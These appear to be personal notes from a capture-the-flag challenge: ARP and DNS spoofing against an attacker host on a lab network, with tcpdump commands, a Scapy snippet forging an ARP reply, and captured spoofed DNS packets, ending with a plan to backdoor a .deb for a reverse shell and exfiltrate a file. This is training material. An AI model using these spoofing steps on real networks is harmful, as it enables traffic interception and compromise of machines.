Host 10.6.6.35 is attacker controlled. Get command line access.
Pingable from main host
	* Have network connectivity


	Local network is 10.6.0.3/16 so we have direct L2 connectivity to the attacker server


	# Sample provided scripts
	arp_res.py
		* Comments in the script indicate that we need to construct a ARP response to steer traffic to our host
	dns_res.py
		* Comments in the script indicate that we need to construct a DNS response to steer traffic either to our host or another host.

	
	# Sample packet captures - Can use these to extract the full ARP fields if needed.

	ARP Request looking for IP address 10.10.10.1
    		1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2
    ARP Reply responding with with MAC for IP 10.10.10.1
		    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00

	DNS Request - tshark
		    1   0.000000 192.168.170.8 → 192.168.170.20 DNS 74 Standard query 0x75c0 A www.netbsd.org
	DNS Response - tshark
		    2   0.048911 192.168.170.20 → 192.168.170.8 DNS 90 Standard query response 0x75c0 A www.netbsd.org A 204.152.190.12


	They say to capture without name resolution otherwise it will hang
	tshark -nnr arp.pcap
	tcpdump -nnr arp.pcap

	-r is for read only need the -nn for host and port numberes

	Capturing on the interface (eth0) on the host we see that the attacker is arping for a MAC for 10.6.6.53.

	```
	guest@4e6ce9945b36:~$ tcpdump -nn -i eth0 arp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
01:19:44.513407 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
01:19:45.545516 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
01:19:46.589695 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
01:19:47.629401 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
01:19:48.673522 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
```

Doing some basic thinking, the `.53` here means it is a DNS server and its arping to do a name resolution to do an http GET which will serve out some reverse shell payload we want, or something like that.

Step 1 - Getting the arp response correct
ARP format details here: http://www.tcpipguide.com/free/t_ARPMessageFormat.htm

Incoming Request:
###[ ARP ]### 
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = who-has
  hwsrc     = 4c:24:57:ab:ed:84
  psrc      = 10.6.6.35
  hwdst     = 00:00:00:00:00:00
  pdst      = 10.6.6.53

 Response Should be:
 ###[ ARP ]### 
  hwtype    = 0x2	---
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at (0x02) --
  hwsrc     = 02:42:0a:06:00:03 --
  psrc      = 10.6.6.53 --
  hwdst     = 4c:24:57:ab:ed:84 --
  pdst      = 10.6.6.35 --

Sample constructed with the following code
```python
if __name__ == "__main__":
    a = ARP(pdst="10.6.6.35")

    a.op = 2 # arp reply
    a.plen = 4
    a.hwlen = 6
    a.ptype = 2048
    a.hwtype = 1
    a.hwsrc = "02:42:0a:06:00:03"
    a.psrc = "10.6.0.3"
    a.pdst = "10.6.6.35"
    a.hwdst = "4c:24:57:ab:ed:84"
    a.show()
```
```bash
###[ ARP ]###
  hwtype    = 0x1
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = 02:42:0a:06:00:03
  psrc      = 10.6.0.3
  hwdst     = 4c:24:57:ab:ed:84
  pdst      = 10.6.6.35
```


Success, DNS request is:
02:43:13.857797 IP 10.6.6.35.57847 > 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
        0x0000:  4500 003c 0001 0000 4011 5a4d 0a06 0623  E..<....@.ZM...#
        0x0010:  0a06 0635 e1f7 0035 0028 5866 0000 0100  ...5...5.(Xf....
        0x0020:  0001 0000 0000 0000 0366 7470 066f 7375  .........ftp.osu
        0x0030:  6f73 6c03 6f72 6700 0001 0001            osl.org.....
02:43:13.866331 IP 10.6.6.53.53 > 10.6.6.35.52687: 0- 1/0/0 A 10.6.0.3 (62)
        0x0000:  4500 005a 0001 0000 4011 5a2f 0a06 0635  E..Z....@.Z/...5
        0x0010:  0a06 0623 0035 cdcf 0046 3e9d 0000 8100  ...#.5...F>.....
        0x0020:  0001 0001 0000 0000 0366 7470 066f 7375  .........ftp.osu
        0x0030:  6f73 6c03 6f72 6700 0001 0001 0366 7470  osl.org......ftp
        0x0040:  066f 7375 6f73 6c03 6f72 6700 0001 0001  .osuosl.org.....
        0x0050:  0000 0000 0004 0a06 0003                 ..........

From the capture, it looks like the victim is trying to resolve an FTP server. So, we'll serve them a DNS record pointing back to the attacker (us) and wait for the FTP connection next.

UDP packet received
###[ Ethernet ]### 
  dst       = 02:42:0a:06:00:04
  src       = 4c:24:57:ab:ed:84
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x5a4d
     src       = 10.6.6.35
     dst       = 10.6.6.53
     \options   \
###[ UDP ]### 
        sport     = 34972
        dport     = domain
        len       = 40
        chksum    = 0xb1c1
###[ DNS ]### 
           id        = 0
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'ftp.osuosl.org.'
            |  qtype     = A
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None


DNS Sample Response
###[ DNS ]###
  id        = 0				//set from packet
  qr        = 1				//?
  opcode    = QUERY  		//?
  aa        = 0				//?
  tc        = 0				//?
  rd        = 1				//?
  ra        = 1				//set to 1
  z         = 0				//?
  ad        = 0				//?
  cd        = 0				//?
  rcode     = ok			//?
  qdcount   = 1				// set to 1 - query record from the request
  ancount   = 5				// set to 1
  nscount   = 0				//?
  arcount   = 0				//?
  \qd        \
   |###[ DNS Question Record ]###
   |  qname     = 'www.thepacketgeek.com.'
   |  qtype     = A
   |  qclass    = IN
  \an        \
   |###[ DNS Resource Record ]###
   |  rrname    = 'www.thepacketgeek.com.'
   |  type      = CNAME
   |  rclass    = IN
   |  ttl       = 299
   |  rdlen     = None
   |  rdata     = 'thepacketgeek.github.io.'
   |###[ DNS Resource Record ]###
   |  rrname    = 'thepacketgeek.github.io.'
   |  type      = A
   |  rclass    = IN
   |  ttl       = 3599
   |  rdlen     = None
   |  rdata     = 185.199.108.153
   |###[ DNS Resource Record ]###
   |  rrname    = 'thepacketgeek.github.io.'
   |  type      = A
   |  rclass    = IN
   |  ttl       = 3599
   |  rdlen     = None
   |  rdata     = 185.199.109.153
   |###[ DNS Resource Record ]###
   |  rrname    = 'thepacketgeek.github.io.'
   |  type      = A
   |  rclass    = IN
   |  ttl       = 3599
   |  rdlen     = None
   |  rdata     = 185.199.110.153
   |###[ DNS Resource Record ]###
   |  rrname    = 'thepacketgeek.github.io.'
   |  type      = A
   |  rclass    = IN
   |  ttl       = 3599
   |  rdlen     = None
   |  rdata     = 185.199.111.153
  ns        = None
  ar        = None



.###[ Ethernet ]### 
  dst       = 02:42:0a:06:00:02
  src       = 4c:24:57:ab:ed:84
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 60
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x5a4d
     src       = 10.6.6.35
     dst       = 10.6.6.53
     \options   \
###[ UDP ]### 
        sport     = 58168
        dport     = domain
        len       = 40
        chksum    = 0x5725
###[ DNS ]### 
           id        = 0
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'ftp.osuosl.org.'
            |  qtype     = A
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None

.###[ Ethernet ]### 
  dst       = 4c:24:57:ab:ed:84
  src       = 02:42:0a:06:00:02
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = None
     tos       = 0x0
     len       = None
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = None
     src       = 10.6.6.53
     dst       = 10.6.6.35
     \options   \
###[ UDP ]### 
        sport     = domain
        dport     = 33298
        len       = None
        chksum    = None
###[ DNS ]### 
           id        = 0
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 1
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'ftp.osuosl.org.'
            |  qtype     = A
            |  qclass    = IN
           \an        \
            |###[ DNS Resource Record ]### 
            |  rrname    = 'ftp.osuosl.org.'
            |  type      = A 
            |  rclass    = IN
            |  ttl       = 0
            |  rdlen     = None
            |  rdata     = '10.6.0.2'
           ns        = None
           ar        = None



So it worked - Issue i had was I was providing a CNAME which actually caused it to crash background.py

After running the test, it showed that the next step was to go to port 80 and likely request a website. Can figure out the git request using `server.http`.

Now, we need, it appears to backdoor a deb file to get a reverse shell on the machine, or open a bind shell

The request is being executed via curl (user agent).

The file to exfil is at: /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt.
